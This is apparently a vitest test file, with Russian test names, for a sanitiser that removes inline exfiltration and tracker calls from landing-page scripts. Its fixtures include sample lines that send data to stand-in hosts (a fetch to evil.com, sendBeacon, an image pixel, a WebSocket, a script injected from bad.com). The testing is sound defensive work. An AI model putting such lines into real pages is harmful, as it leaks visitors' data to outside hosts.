import { describe, it, expect } from 'vitest';
import { parseJs } from '../ast/parse.js';
import { removeInlineExfil } from '../remove-inline-exfil.js';
import type { ChangelogEntry } from '../../../types.js';

function run(code: string, mainHost = 'landing.com') {
  const ast = parseJs(code, 'test.html');
  if (!ast) throw new Error('Failed to parse');
  const log: ChangelogEntry[] = [];
  const result = removeInlineExfil(
    code,
    { source: code, relPath: 'test.html', mainHost },
    ast,
    log,
  );
  return { ...result, log };
}

describe('removeInlineExfil', () => {
  it('удаляет fetch на внешний хост, сохраняет остальное', () => {
    const code = `
      function showMenu() { document.querySelector('.menu').style.display='block'; }
      fetch('https://evil.com/track?data=123');
      showMenu();
    `;
    const { code: out, removed, log } = run(code);
    expect(removed).toBe(1);
    expect(out).not.toContain('evil.com');
    expect(out).toContain('showMenu');
    expect(log).toHaveLength(1);
    expect(log[0]!.type).toBe('EXFIL-FETCH');
  });

  it('НЕ трогает fetch на внутренний хост', () => {
    const code = `fetch('/api/subscribe', { method: 'POST' });`;
    const { removed, code: out } = run(code);
    expect(removed).toBe(0);
    expect(out).toContain('/api/subscribe');
  });

  it('НЕ трогает fetch на trusted хост', () => {
    const code = `fetch('https://fonts.googleapis.com/css2?family=Roboto');`;
    const { removed } = run(code);
    expect(removed).toBe(0);
  });

  it('удаляет вызов fbq()', () => {
    const code = `fbq('track', 'Purchase');`;
    const { removed, code: out, log } = run(code);
    expect(removed).toBe(1);
    expect(out).not.toContain('fbq');
    expect(log[0]!.type).toBe('TRACKER-CALL');
  });

  it('удаляет navigator.sendBeacon на внешний хост', () => {
    const code = `navigator.sendBeacon('https://tracker.io/log');`;
    const { removed, code: out } = run(code);
    expect(removed).toBe(1);
    expect(out).not.toContain('sendBeacon');
  });

  it('удаляет new Image().src = external', () => {
    const code = `new Image().src = 'https://pixel.com/hit';`;
    const { removed, code: out } = run(code);
    expect(removed).toBe(1);
    expect(out).not.toContain('pixel.com');
  });

  it('удаляет WebSocket на внешний хост', () => {
    const code = `new WebSocket('wss://live.com/stream');`;
    const { removed, code: out } = run(code);
    expect(removed).toBe(1);
    expect(out).not.toContain('live.com');
  });

  it('удаляет document.write с внешним скриптом', () => {
    const code = `document.write('<script src="https://bad.com/x.js"><\/script>');`;
    const { removed, code: out } = run(code);
    expect(removed).toBe(1);
    expect(out).not.toContain('document.write');
  });

  it('возвращает пустую строку, если после удаления ничего не осталось', () => {
    const code = `fetch('https://evil.com/track');`;
    const { code: out, removed } = run(code);
    expect(removed).toBe(1);
    expect(out).toBe('');
  });

  it('НЕ трогает непарсируемый JS', () => {
    const code = '{{{{';
    const ast = parseJs(code, 'test.html');
    expect(ast).toBeNull();
    if (ast) {
      // Этот блок никогда не выполнится, но TypeScript требует проверки
      const log: ChangelogEntry[] = [];
      removeInlineExfil(code, { source: code, relPath: 'test.html', mainHost: 'example.com' }, ast, log);
    }
  });
});
